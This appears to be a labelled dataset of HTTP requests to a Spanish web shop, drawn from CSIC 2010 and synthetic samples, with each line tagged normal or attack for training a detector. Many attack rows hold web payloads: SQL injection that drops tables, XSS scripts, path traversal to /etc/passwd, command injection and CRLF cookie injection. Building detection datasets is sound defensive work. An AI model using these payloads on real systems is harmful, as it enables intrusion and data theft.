+GET /tienda1/miembros/editar.jsp?modo=registro&login=bousfiel59&password=De%219%E1n&nombre=Genara&apellidos=Boneton+Casares&email=eckhardt%40englishiseasy.nc&dni=B4B2559359K&direccion=Pasaje+Calzadilla+14%2C+10%3FH&ciudad=Carboneros&cp=27739&provincia=Madrid&ntc=3702071436789346&B1=Registrar,attack,csic2010
+GET /login?page=jAVAScripT:alERT(DocumeNT.coOkie),attack,synthetic
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=nolie&pwd=nort%24e%D1a&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=harty&password=torn%E9s&nombre=Doreteo&apellidos=Llobet&email=brace4%40velazquezlarra%F1aga.kz&dni=19783837L&direccion=Alcalde+Lopez+Ranca%F1o%2C+194%2C+3-E&ciudad=Vilafam%E9s&cp=09270&provincia=Valladolid&ntc=1499600534131254&B1=Registrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro%27+DELETE+FROM+USERS&login=messier&password=c7b183o&nombre=Nicodemo&apellidos=Triola+Villuend&email=galloway%40rtce.gu&dni=35507822P&direccion=Numero+15%2C+151%2C+&ciudad=Castrillo+de+la+Guare%F1a&cp=23657&provincia=Toledo&ntc=1278501676319264&B1=Registrar,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=%7C&login=swidersk&password=balarrasa&nombre=Yaco&apellidos=Moriana+Romanov&email=sintes%40noticiasenvivo.mz&dni=58500108E&direccion=C%2F+Parque+Iguazu+99%2C+&ciudad=Ag%FCimes&cp=48940&provincia=Valencia&ntc=3622353817159390&B1=Registrar,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=2&nombre=Queso+Manchego&precio=100&cantidad=64&B1A=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=ronna&password=96r1ulg30&nombre=Berto&apellidos=Binder+Gene&email=limburg%40estoespresto.cd&dni=04607227M&direccion=C%2F+Cuenca+S%2FN+&ciudad=Chilches%2FXilxes&cp=18410&provincia=Baleares+%28Illes%29&ntc=4963506739861376&B1=Registrar,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=2&nombre=Ques%2Bo+Manchego&precio=85&cantidad=85&B1=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=100&cantidad=43&B1=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=valliere&pwd=tova&remember=off&B1=Entrar,normal,csic2010
+GET /view?name=../../etc/passwd,attack,synthetic
+GET /tienda1/publico/anadir.jsp?id=1%2F&nombre=Queso+Manchego&precio=100&cantidad=76&B1=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=9734&B1=Pasar+por+caja,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=85&cantidad=1&B1=A%F1adir+al+carrito,normal,csic2010
+POST /view BODY: id=images/logo.png,normal,synthetic
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=salsber%2By&pwd=7u63ira681&remember=on&B1=Entrar,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=thyagara&password=fUeRTe&nombre=Sol&apellidos=Gorgone+Oteo&email=tissier%40b-sign.cg&dni=%2500&direccion=Calle+Alboran+39%2C+&ciudad=Millanes&cp=49731&provincia=Tarragona&ntc=4096797311989091&B1=Registrar,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=86&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=krishna&pwd=%2Cb%2F%FAB%2CalO&remember=on&B1=Entrar,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=sabry&pwdA=ce8cuate&remember=off&B1=Entrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=charmain&password=94n409n0&nombre=Naiara&apellidos=Farr%E0+Beterette&email=obrian%40alpesfranceses.com.sg&dni=02522903X&direccion=Calle+Zamora%2C+6%2C+&ciudad=Guarrom%E1n&cp=02652&provincia=Badajoz&ntc=1833013862012056&B1=Registrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=schlemme&password=al4erchig7L&nombre=Feliciano&apellidos=Bergas+Patraca&email=trotta.carslisle%40softstylestudio.ki&dni=38227979R&direccion=Calle+Mar+De+Aragon+48+1%3FE&ciudad=Fav%2F*ara&cp=16710&provincia=Guadalajara&ntc=0473794196460600&B1=Registrar,attack,csic2010
+GET /view?file=cats and dogs,normal,synthetic
+POST /tienda1/publico/anadir.jsp BODY: id=1%2F&nombre=Vino+Rioja&precio=100&cantidad=45&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=chiquia0&pwd=4I8f0&rememberA=on&B1=Entrar,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=calleja&password=9u5es2v83ent2&nombre=Tila&apellidos=Acurio+Bayona&email=wessell.georg%40smalltec.md&dni=83360974G&direccion=Calle+La+Rambla+S%2FN+4%3FD&ciudad=Taravilla&cp=44143&provincia=A+Coru%F1a&ntc=9019896710304929&B1=Registrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=dotsey&pwd=ho6d021&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=7749&B1=Pasar+por+caja%2F,attack,csic2010
+GET /search?comment=' or 1=1 --,attack,synthetic
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=6030&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&loginA=juni&pwd=8EsCR1BIr&remember=on&B1=Entrar,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=chaya&password=c0o4c53TI81&nombre=Zbigniew&apellidos=U%2Brbina+Cebrino&email=ramirez%40a2hotels.io&dni=23423909L&direccion=Nucleo+Residencial+San+Carlos%2C+5%2C+3%3FH&ciudad=Herrera&cp=33785&provincia=Soria&ntc=2124793186518142&B1=Registrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=jaimin5&password=6in603r0&nombre=Flor&apellidos=Vegueria+Surinyac&email=baker-oftebro%40cpanelweb.com.so&dni=22853653W&direccion=Calle+Obispo+Gonzalez+De+Toro+S%2FN%2C+&ciudad=Perales+del+Puerto&cp=37779&provincia=C%E1ceres&ntc=7740502841202753&B1=Registrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=tabina&password=lasciva&nombre=Lebana&apellidos=Cebrian+Closella&email=mallinson7%40cpanelhost.com.vi&dni=37480374B&direccion=Calle+Cubas+110+&ciudad=San+Crist%F3bal+de+la+Cuesta&cp=08410&provincia=Burgos&ntc=2498736826583284&B1=Registrar,normal,csic2010
+GET /postinfo.html,attack,csic2010
+POST /download BODY: comment=/var/www/../../etc/hosts,attack,synthetic
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=540&B1=Confirmar%2F,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=pavlovic&pwd=barR6lLa&remember=off&B1=Entrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=linden&password=organero&nombre=Alio&apellidos=Gallegos+Angeleri&email=shumsky.zalata5%40telelujo.ci&dni=41909752A&direccion=Alicante+119%2C+&ciudad=Benalm%E1dena&cp=25140&provincia=Ja%E9n&ntc=9201759661755850&B1=Registrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=reubens&password=9sc1ti81&nombre=Shazmin&apellidos=Martinez&email=esser-wrixon5%40atorre.se&dni=47651101T&direccion=C%2F+El+Jacinto%2C+132%2C+&ciudad=Relleu&cp=41564&provincia=Cuenca&ntc=9327671462034435&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=abdalla&password=caluyo&nombre=Celedonia&apellidos=Bes+Novalbos&email=smithson%40esmarbella.cu&dni=02875410L&direccion=Calle+Leoncio+Rodriguez%2C+25+10%3FC&ciudad=Olmedilla+de+Eliz&cp=21240&provincia=Almer%EDa&ntc=0500121668297031&B1=Registrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=massimo&password=37i0440ilo&nombre=Genesis&apellidos=Nadeix+Laumann&email=oxley%40muevetuweb.lb&dni=10410049L&direccion=Pl.+Curro+Cuchares%2C+72%2C+&ciudad=Cortes+de+la+Frontera&cp=43426&provincia=Zaragoza&ntc=7322226923121778&B1=Registrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=853&B1=%27+AND+%271%27%3D%271,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=85&cantidad=59&B1=A%F1adir+al+carrito,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=aube&password=coho5b617&nombre=Manel&apellidos=Feixa+Urgell&email=jarett%40salsaspain.eg&dni=07434331H&direccion=Berrocala%2C+151%2C+&ciudad=Renedo+de+Esgueva&cp=16760&provincia=Zamora&ntc=8543941291101641&B1=Registrar,normal,csic2010
+GET /samples/htmlsamp/styles.htm,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=grimshaw&password=sapotina&nombre=Policarpo&apellidos=Feixas&email=zappa%40touringa.zr&dni=60328065P&direccion=Abajo%2C+159%2C+10%3FC&ciudad=Almensilla&cp=10649&provincia=Ciudad+Real&ntc=0025770291372518&B1=Registrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=goertzen&pwd=4urr3at9&remember=on&B1=Entrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=davina&passwordA=53%24nse0a0le&nombre=Greta&apellidos=Tress+Jan%E9&email=kalinowski5%40minimizar.az&dni=85473715B&direccion=Calle+Piqueras+43+3%3FA&ciudad=Agoncillo&cp=40152&provincia=Salamanca&ntc=6165671894107883&B1=Registrar,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=babbage&password=Lej%EDSimoS&nombre=Higinia&apellidos=Arribas+Larrakoetxea&email=nichetti%40multireform.bf&dni=86111515K&direccion=Cal%2Ble+La+Felipa+S%2B%2FN%2C*+12-B&ciudad=Salillas&cp=48150&provincia=Barcelona&ntc=4618456072080141&B1=Registrar,attack,csic2010
+POST /search BODY: name=<sCriPT>AlErT(1)</ScRIpt>,attack,synthetic
+GET /tienda1/publico/registro.jsp?modo=registro&login=seda&password=apartadero&nombre=Remberta&apellidos=Ortigas+Huerta&email=pedemonte%40mystyleperfume.th&dni=97649797P&direccion=Calle+Huesca%2C+136%2C+&ciudad=Fuente+Encalada&cp=43790&provincia=Palencia&ntc=7303174655343439&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=fysh&password=iN93I5t555i8&nombre=Baroncio&apellidos=Crespi+Loaiza&email=huddleston%40easyviaggio.th&dni=41383398G&direccion=Ismael+Serrano%2C+143+&ciudad=Villarroya+del+Campo&cp=17161&provincia=Barcelona&ntc=1769688171302236&B1=Registrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=coloads&pwdA=riosellano&remember=off&B1=Entrar,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modoA=entrar&login=orel&pwd=%F112%F1a&remember=on&B1=Entrar,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=carli8&password=5im2n507&nombre=Jos%E9+Mar%EDa&apellidos=Vilageli+Bonet&email=baylor%40magichobby.sy&dni=80135662M&direccion=Calle+Estrella+Orion+190+&ciudad=Encinillas&cp=09681&provincia=Zaragoza&ntc=2558545383527310&B1=Registrar%2520,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registroAND+1%3D1&login=blinnie&password=8jengib%24r5&nombre=Valiente&apellidos=Sanfeliu+Maurici&email=cabrera_bowles%40alfombra.com.ge&dni=35993227K&direccion=Romero+De+Cordoba+65%2C+&ciudad=Cubla&cp=30890&provincia=Valencia&ntc=8073640518599358&B1=Registrar,attack,csic2010
+GET /login?name=x%27%20UNION%20SELECT%20NULL%2CNULL--,attack,synthetic
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=alden9&password=BOrceguiner%EDa&nombre=Tsuneko&apellidos=Legorreta+Nomdedeu&email=child.coleman%40pavimentosalagon.pn&dni=60153420W&direccion=Carretera+Oca%F1a%2C+103%2C+3C&ciudad=Ambite&cp=15510&provincia=Huelva&ntc=5662773698137803&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=chungsik6&password=inten-sament6&nombre=Edda&apellidos=Balseca+Figueras&email=shenar%40nikemujeres.gg&dni=16934679D&direccion=Zearkaleta+Arbolantza%2C+65+1-A&ciudad=Cass%E0+de+la+Selva&cp=17869&provincia=Burgos&ntc=3345463772576828&B1=Registrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&loginA=chong&password=2hul7do&nombre=Loreto&apellidos=Torrelli+Casares&email=bog%40paremoselalzheimer.is&dni=03582434T&direccion=Plza.+Malta+58+2%3FH&ciudad=Od%E8n&cp=25135&provincia=Madrid&ntc=1689148382896192&B1=Registrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=shubaly&password=tacita&nombre=Xaviera&apellidos=Benejam+Anglaril&email=rufino%40citycvs.as&dni=83585437X&direccion=Passeig+De+Monjo+102%2C+11%3FA&ciudad=Villanueva+de+Algaidas&cp=24768&provincia=Tarragona&ntc=3363230401310436&B1=Registrar,normal,csic2010
+GET /tienda1/publico/anadir.jsp.OLD,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=spearman&password=duodecimal&nombre=Teodoro&apellidos=Astor+Bobet&email=benjamin%40maletti.it&dni=71946054F&direccion=C%2F+Ribera%2C+151+&ciudad=Estopi%F1%E1n+del+Castillo&cp=1460A&provincia=Navarra&ntc=7488661882059416&B1=Registrar,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=669&B1A=Pasar+por+caja,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=3&nombre=Queso+Manchego&precio=85&cantidad=39&B1=A%F1adir+al+carrito,normal,csic2010
+POST /profile BODY: file=| dir C:\,attack,synthetic
+GET /products?user=%3CbOdY%20OnLOaD%3DaLERT%28%27xsS%27%29%3E,attack,synthetic
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=4144&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=1400&B1=Pasar+por+caja%2F,attack,csic2010
+GET /tienda1/publico/registro.jsp/asf-logo-wide.gif.old,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=%27%2Cb%27rieda&pwd=ric8Me6te&remember=on&B1=Entrar,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=hungkang&password=escuder%F3n&nombre=Nayme&apellidos=Campi+Delgados&email=inescourt7%40citycvs.mil&dni=14188360M&direccion=Pla%E7a+De+Margarida+Xirgu+141%2C+2H&ciudad=Bardallur&cp=15635&provincia=Navarra&ntc=1891285759644518&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=herak&password=v1373948c6a&nombre=Malinda&apellidos=Diclo+Ornosa&email=schull%40cursosenlaplaya.ro&dni=43008564J&direccion=Pasaje+Arcillero%2C+177%2C+2%3FG&ciudad=Pedrosa+del+Reyany%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&cp=37874&provincia=Cuenca&ntc=3359754319393302&B1=Registrar,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertarAND+1%3D1&precio=252&B1=Confirmar,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modoA=insertar&precio=6858&B1=Confirmar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=seagrove&password=pataleo&nombre=Grey&apellidos=Bollit+Ingl%E9s&email=weigel%40lamasguapa.cc&dni=15744863Y&direccion=Avda.+El+Vado%2C+72+&ciudad=Torno%2C+El&cp=18129&provincia=C%E1ceres&ntc=2139911097438297&B1=Registrar%2B,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=9168&B1=Confirmar%2F,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=2066&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=4639&B1=Confirmar%2F,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=grainger&password=dilecci%F3n&nombre=%3FBa%27bel-i&apellidos=Rodamila&email=nazimova%40ibizasounds.sh&dni=47610956J&direccion=C%2F+Selva%2C+14%2C+5%3FF&ciudad=Farrera&cp=18290&provincia=Madrid&ntc=8021682596257423&B1=Registrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&loginA=euysoo&password=m7n%EDfica&nombre=Tarciano&apellidos=Donnadieu+Vivanco&email=dombasle%40tagarautomation.ad&dni=30585356W&direccion=Calle+Santo+Domingo+Savio+174+13-B&ciudad=Jubrique&cp=49325&provincia=Badajoz&ntc=9595137071003174&B1=Registrar,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=zunuzi&password=3j&nombre=Idelfonsa&apellidos=Girones&email=haeussler%40corjet.jo&dni=46606571S&direccion=Calle+Asturias+158+6H&ciudad=T%E0rbena&cp=43877&provincia=Soria&ntc=7973761744992556&B1=Registrar,normal,csic2010
+POST /contact BODY: name=; ping -c 4 127.0.0.1,attack,synthetic
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=marketa&password=mantela-do&nombre=Rohan&apellidos=Pizorno+Talarn&email=boreo%40creacionesdolcevita.mo&dni=85130664M&direccion=Calle+Catedratico+Eugenio+Ubeda+Romero%2C+S%2FN%2C+&ciudad=V%E9lez+de+Benaudalla&cp=43364&provincia=Soria&ntc=7360017663684858&B1=Registrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=5540&B1=Confirmar%2F,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=hogan&password=cha377&nombre=Iannir&apellidos=Lembomba+Llargues&email=kaufman%40mobilecrm.ao&dni=26321461P&direccionA=Travesia+Florida+129%2C+&ciudad=Castillo+de+las+Guardas%2C+El&cp=03294&provincia=Navarra&ntc=3806083089052885&B1=Registrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=orr&password=querando&nombre=Adalgisa&apellidos=T%E1vara+Ganci&email=baz_azais%40filtraciondehumos.sb&dni=47106635J&direccion=Calle+Carme+Karr%2C+65%2C+10A&ciudad=A%F1%F3n+de+Moncayo&cp=46470&provincia=Valencia&ntc=9481894123052720&B1=Registrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=alta&password=reencar%21naci%F3n&nombre=Salom%E9&apellidos=Hoste+Ustrell&email=verdon.denissis%40esencialser.cv&dni=21096784B&direccion=Calle+Torrefina+127%2C+9-D&ciudad=Alins&cp=18011&provincia=Zaragoza&ntc=1424046074446170&B1=Registrar,normal,csic2010
+GET /CFIDE/administrator/navserver.cfm,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=4282&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=ketan&pwd=mula%2Ctizar&remember=off&B1=Entrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=uunko7&password=cHopAl&nombre=Tr%E1nsito&apellidos=C%2Fonesa+Zengle%2Cin&email=bagdasarian%40lola-lutscht.pe&dni=88623470P&direccion=Carrer+Trieta+125+&ciudad=Calles&cp=25440&provincia=Teruel&ntc=5617420571078816&B1=Registrar,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=2&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=85&cantidad=37&B1=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=berthe&password=adruba_do&nombre=Agustina&apellidos=Viver&email=eastside-luco%40apicultor.ms&dni=44636251J&direccion=C%2Fjon+Vinos+De+Esquivias%2C+S%2FN+&ciudad=Torralba+del+Pinar&cp=32400&provincia=Cuenca&ntc=2285033553413514&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=andries&password=bezante&nombre=Nicasio&apellidos=Suau+Feixa&email=hardwick%40corjet.gh&dni=97084633T&direccion=Partida+Lliriet+D%27en+Mig%2C+135%2C+10%3FA&ciudad=Villena&cp=46269&provincia=Navarra&ntc=4641290123831700&B1=Registrar,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: idA=3&nombre=Queso+Manchego&precio=100&cantidad=15&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=ofilia&password=santurr%F3n&nombre=Lauran&apellidosA=Tonk+Carrizales&email=engel%40longboarders.cu&dni=03303370H&direccion=Plza.+Juan+Zorrilla%2C+107+9%3FF&ciudad=Bruc%2C+El&cp=28522&provincia=Granada&ntc=1816581279872417&B1=Registrar,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=82&B1A=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/imagenes/~,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=100&cantidad=23&B1=A%F1adir+al+carrito,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=juni&pwd=%2Cj58A&remember=on&B1=Entrar,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=mongo&password=behetr%EDa&nombre=Fanny&apellidos=Llort+Pato&email=twiggy%40ladigianni.vc&dni=07831245K&direccion=Calle+Do+Fuso+19+&ciudad=Piqueras&cp=06208&provincia=Soria&ntc=3479188393486250&B1=Registrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=5445&B1=Pasar+por+caja,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=crean&password=allegadiza&nombre=Porcio&apellidos=Ubach+Rodr%EDguez&email=sketchley%40esposo.com.at&dni=76610505N&direccion=Carlos+Marx+186+3%3FB&ciudad=Mu%F1osancho&cp=14208&provincia=Sevilla&ntc=0129380043103873&B1=Registrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=mc&pwd=cerverano&remember=off%2F&B1=Entrar,attack,csic2010
+POST /tienda1/publico/vaciar.jsp BODY: B2=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=4241&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=oestreic&password=f399ici0&nombre=Ginette&apellidos=Cabada+Ferrus&email=nix%40quecole.vc&dni=16471396S&direccion=Calle+Lindachiquia+141+3%3FE&ciudad=San+Bartolom%E9+de+las+Abiertas&cp=40444&provincia=Cuenca&ntc=0085184895968394&B1=Registrar,normal,csic2010
+POST /login BODY: name=report.pdf,normal,synthetic
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=kea&pwd=cautiverio&remember=off&B1=Entrar,normal,csic2010
+GET /tienda1/publico/vaciar.jsp/.old,attack,csic2010
+POST /search BODY: q=cats and dogs,normal,synthetic
+GET /tienda1/publico/anadir.jsp?id=3%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Queso+Manchego&precio=100&cantidad=66&B1=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/publico/anadir.jsp?idA=2&nombre=Queso+Manchego&precio=100&cantidad=65&B1=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=saskia&password=8un03a&nombre=Bertilia&apellidos=Andino+Sandate&email=gastoni%40stainless.iq&dni=99745017C&direccion=Pl.+Vianako+Printzearen%2C+107+12H&ciudad=Villanueva+de+San+Carlos&cp=16620&provincia=Barcelona&ntc=7857158360903973&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=seroka&password=indebido&nombre=Artaldo&apellidos=Gir%F3n+Cece%F1as&email=horeth%40twinjet.al&dni=76925832D&direccion=Sagarra+147+&ciudad=Tiedra&cp=41565&provincia=Madrid&ntc=6214022168975185&B1=Registrar,normal,csic2010
+POST /login BODY: user=<scRiPt>AlErT(1)</SCRiPT>,attack,synthetic
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=yigal&password=anF6_9ti%D34915&nombre=Sharim&apellidos=Grino+Crosas&email=santacroce_prueckner%40puravidasa.bn&dni=68875056S&direccion=C%2F+Padre+Presentat%2C+26+&ciudad=Torremanzanas%2FTorre+de+les+Ma%E7anes%2C+la%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&cp=31750&provincia=%C1vila&ntc=7191364141648176&B1=Registrar,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=2&nombre=Queso+Manchego&precio=85&cantidad=86&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidad=22&B1A=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=1&nombre=Queso+Manchego&precio=100&cantidad=40&B1=A%F1adir+al+carrito,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=7012&B1=Pasar+por+caja,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&loginA=di_cosol&pwd=RopAVeJERO&remember=on&B1=Entrar,attack,csic2010
+POST /search BODY: file=please delete my old post,normal,synthetic
+GET /tienda1/publico/registro.jsp?modo=registro&login=armand&password=prusiato&nombre=Samia&apellidos=Catalayud+Mirabet&email=balademas.mareuil6%40enlanzarote.com.vc&dniA=28178710F&direccion=C%2F+Cala%2C+9%2C+&ciudad=Mutxamel&cp=25332&provincia=Zaragoza&ntc=8608089924764976&B1=Registrar,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=anurag&password=am60A4i7o&nombre=G%3Fl%2Benys&apellidos=Amazarray+Gersol&email=martell%40923.pe&dni=15138092K&direccion=Sant+Josep%2C+93%2C+&ciudad=Castellar+del+Vall%E8s&cp=03813&provincia=Soria&ntc=2906865498291139&B1=Registrar,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=5760&B1=Pasar+por+caja,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=7620&B1=Pasar+por+caja,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=renem%2Fa&pwd=v%E1L70am4390&remember=on&B1=Entrar,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=fallahi2&pwd=co5e0&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=dracula9&pwd=ametalar&remember=off&B1=Entrar,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precioA=85&cantidad=50&B1=A%F1adir+al+carrito,attack,csic2010
+POST /download BODY: name=images/logo.png,normal,synthetic
+POST /download BODY: comment=....//....//etc/passwd,attack,synthetic
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=chonchan&pwd=c%2C0%E1%2C%2F75i5le&remember=off&B1=Entrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=ba%3Fb%2Cbie&password=eSOT%C9R2ca&nombre=Fede&apellidos=Romera+Zuleta&email=dacgnault%40ajuntamentbarcelona2-0.name&dni=34382308E&direccion=C%2F+Cuellar+177+&ciudad=Albalate+de+las+Nogueras&cp=24915&provincia=Segovia&ntc=8975566519527853&B1=Registrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=zureik&password=concurrente&nombre=Lino&apellidos=Barea+Runke&email=schulz%40hiperbarcelona.hn&dni=64105812Mparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&direccion=Camoe%2C+189%2C+&ciudad=Olv%E9s&cp=03579&provincia=Guip%FAzcoa&ntc=6282081679981232&B1=Registrar,attack,csic2010
+POST /contact BODY: q=new york,normal,synthetic
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=libbey&pwd=141c1U01&remember=on&B1A=Entrar,attack,csic2010
+GET /_vti_txt/,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=stetson&pwd=a9i5t2d&remember=off&B1=Entrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=mccreano&pwd=rascadura&remember=off&B1=Entrar,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidad=9&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=nataliya&pwd=p44m8scu6916n&remember=off&B1=Entrar,normal,csic2010
